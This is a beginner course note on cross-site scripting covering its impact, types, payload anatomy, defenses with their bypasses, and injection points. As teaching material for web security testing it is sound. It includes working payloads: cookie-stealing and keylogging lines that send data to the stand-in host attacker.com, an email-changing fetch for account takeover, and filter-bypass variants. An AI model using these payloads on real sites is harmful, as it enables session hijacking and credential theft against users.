---
tags: [vapt, xss, beginner]
difficulty: beginner
module: "07 - XSS"
topic: "07.01 What is XSS and Why It Matters"
portswigger_labs: "Cross-site scripting"
---

# 07.01 — What is XSS and Why It Matters

## The Core Concept

Cross-Site Scripting (XSS) occurs when an attacker injects malicious JavaScript (or other client-side code) into a web page that other users view. When those users visit the page, the attacker's script executes in their browser — with the same trust level as the legitimate site.

```
NORMAL WEB REQUEST:
  User → https://target.com → Server → HTML/JS → User's browser executes it
  
XSS:
  Attacker injects JS into target.com content
  Victim → https://target.com → Server → HTML + Attacker's JS → Victim's browser executes attacker's JS!
  
KEY INSIGHT:
  The browser can't tell the difference between:
    "legitimate script from target.com" 
    "attacker's script stored in or reflected through target.com"
  
  BOTH run with target.com's origin trust level!
  → Can access cookies for target.com
  → Can read the page DOM
  → Can make requests to target.com APIs on behalf of the user
  → Can redirect the user
  → Can log keystrokes
```

---

## Why XSS Matters — Real Impact

```
1. SESSION HIJACKING (most common):
   Steal HttpOnly-less session cookie → log in as victim
   
   document.location='https://attacker.com/steal?c='+document.cookie
   
   Victim visits page → cookie sent to attacker → attacker logs in as victim!

2. ACCOUNT TAKEOVER (even with HttpOnly cookies):
   → Use XSS to make API calls as the victim:
   fetch('/api/change-email', {method:'POST', body:'{email:attacker@evil.com}'})
   → Change victim's email → request password reset → take over account!

3. CREDENTIAL THEFT (keylogging):
   document.onkeypress = function(e) { 
     fetch('https://attacker.com/log?k='+e.key)
   }
   → Logs every keystroke → captures passwords typed on the page!

4. DOM MANIPULATION (phishing):
   Replace login form with fake form → victim types password → goes to attacker!
   
5. MALWARE DISTRIBUTION (drive-by download):
   → Redirect victims to exploit kit
   
6. INTERNAL PORT SCANNING (via browser):
   → Use XSS to scan internal network from victim's browser!

7. WEBCAM / MICROPHONE (if site has permissions):
   → Capture media if permission was previously granted!
```

---

## XSS Types — Quick Overview

```
REFLECTED XSS:
  → Payload in URL/request → reflected immediately in response
  → Victim must be tricked into clicking a malicious link
  → Example: /search?q=<script>alert(1)</script>
  
STORED (PERSISTENT) XSS:
  → Payload stored in database → served to all visitors
  → More dangerous: no victim clicking needed
  → Example: comment field, username, bio

DOM-BASED XSS:
  → Payload processed by client-side JavaScript (not reflected from server)
  → Server never sees the payload
  → Example: location.hash → inserted into DOM without sanitization
  
BLIND XSS:
  → Payload executed in an admin/internal panel (attacker can't see it)
  → Use out-of-band callbacks to confirm execution
  → Example: user-submitted support ticket → admin views it → XSS fires!
```

---

## Anatomy of an XSS Payload

```html
<!-- SIMPLEST PAYLOAD (test/PoC): -->
<script>alert(1)</script>

<!-- WHAT HAPPENS:
  1. Attacker submits this in a form field / URL
  2. Server stores or reflects it in HTML
  3. Browser receives:
     <html>...<p>User said: <script>alert(1)</script></p>...</html>
  4. Browser parses → sees <script> tag → executes JavaScript!
  5. alert(1) popup appears → XSS CONFIRMED!
-->

<!-- COOKIE STEALING PAYLOAD: -->
<script>document.location='https://attacker.com/steal?c='+encodeURIComponent(document.cookie)</script>

<!-- IMAGE-BASED (no quotes): -->
<img src=x onerror=alert(1)>

<!-- EVENT HANDLER (in attribute context): -->
" onmouseover="alert(1)

<!-- JAVASCRIPT URI: -->
<a href="javascript:alert(1)">Click me</a>
```

---

## How XSS Gets Blocked (Defenses to Know)

```
DEFENSES (and why they're often bypassed):

1. INPUT SANITIZATION:
   Filter: removes <script>
   Bypass: <ScRiPt>alert(1)</ScRiPt>
   Better bypass: <img src=x onerror=alert(1)>

2. OUTPUT ENCODING:
   Convert < → &lt;, > → &gt;, " → &quot;
   CORRECT defense when applied in right context
   Bypass: context-dependent encoding issues!
   
3. CSP (Content Security Policy):
   Restricts which scripts can execute
   Bypass: see 07.15 — CSP Bypass
   
4. HttpOnly cookies:
   Prevents XSS from reading cookies via document.cookie
   Bypass: use XSS to make API calls anyway! (no cookie needed)
   
5. WAF:
   Blocks <script>, onerror=, etc.
   Bypass: encoding, unusual tags, HTTP parameter pollution
```

---

## XSS Injection Points

```
WHERE TO LOOK FOR XSS:
  ✓ Search boxes (reflected in results: "Your search for INPUT")
  ✓ Comment/review fields (stored, appears to all users)
  ✓ Username/profile fields (stored)
  ✓ Error messages ("INPUT is not a valid email")
  ✓ URL parameters reflected in page
  ✓ HTTP headers (User-Agent, Referer shown in admin panel)
  ✓ File names (shown in upload confirmation)
  ✓ Form field values (stored in HTML form value="INPUT")
  ✓ URL fragments (#hash shown in JS)
  ✓ DOM manipulation based on URL
  
TEST STRING:
  Use: <>"'`${} or canary: xss-test-12345
  → Does the canary appear in page source? In what context?
  → Is it encoded? Which chars are encoded?
  → This tells you how to craft the payload!
```

---

## XSS vs CSRF vs Clickjacking (Quick Comparison)

```
XSS:        Attacker's CODE runs in victim's browser on target domain
            → Full access to DOM, cookies, APIs
            
CSRF:       Attacker tricks victim's browser into making request to target
            → No JS execution, relies on existing authentication
            
CLICKJACKING: Attacker overlays target in invisible iframe
            → Victim thinks they click one thing, actually click target UI
```

---

## Related Notes
- [[02 - Reflected XSS]] — reflected XSS in depth
- [[03 - Stored XSS]] — stored XSS in depth
- [[04 - DOM-Based XSS]] — DOM XSS
- [[05 - Blind XSS]] — blind XSS with out-of-band callbacks
- [[21 - XSS Payloads Comprehensive List]] — full payload reference
